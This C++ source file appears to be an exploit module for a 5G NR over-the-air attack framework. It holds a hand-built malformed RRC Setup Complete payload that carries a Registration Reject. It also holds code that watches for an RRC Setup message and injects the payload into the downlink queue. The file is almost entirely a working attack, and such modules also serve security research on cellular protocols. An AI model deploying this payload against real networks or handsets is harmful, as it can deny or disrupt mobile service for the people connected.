// 0123c0000000090005df80105e400340403c4400000000040c951d820b80bc1c00000000003d053f00000000000000
#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

uint8_t raw_rrc_setup_complete[] = {
    0x01, 0x03, 0x00, 0x01,
    0x00, // ACK SN = 2
    0x41, 0x00, 0x0f, 0xc0, 0x00, 0x00, 0x00, 0x2c, 0x80, 0x8f, 0xc0, 0x08,
    0x83, 0x60, 0x00, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00}; // Registration Reject

class MalformedRRCSetupComplete : public Exploit
{
public:
  MalformedRRCSetupComplete(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                            SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    mal_rrc_setup_comp.reset(
        new std::vector<uint8_t>(raw_rrc_setup_complete, raw_rrc_setup_complete + sizeof(raw_rrc_setup_complete)));
  }

  void setup() override
  {
    f_rrc_setup = ws_filter_t::make_filter("nr-rrc.c1 == 1");
    filters.push_back(f_rrc_setup);
  }

  void pre_dissection() override {}

  void post_dissection(uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (f_rrc_setup->match) {
      logger.info("Received RRC Setup message, sending malformed RRC Setup Complete message");
      dl_buffer_queue.push(mal_rrc_setup_comp);
    }
  }

private:
  std::shared_ptr<ws_filter_t>           f_rrc_setup;
  std::shared_ptr<std::vector<uint8_t> > mal_rrc_setup_comp;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new MalformedRRCSetupComplete(dl_buffer_queue_, ul_buffer_queue_);
}
}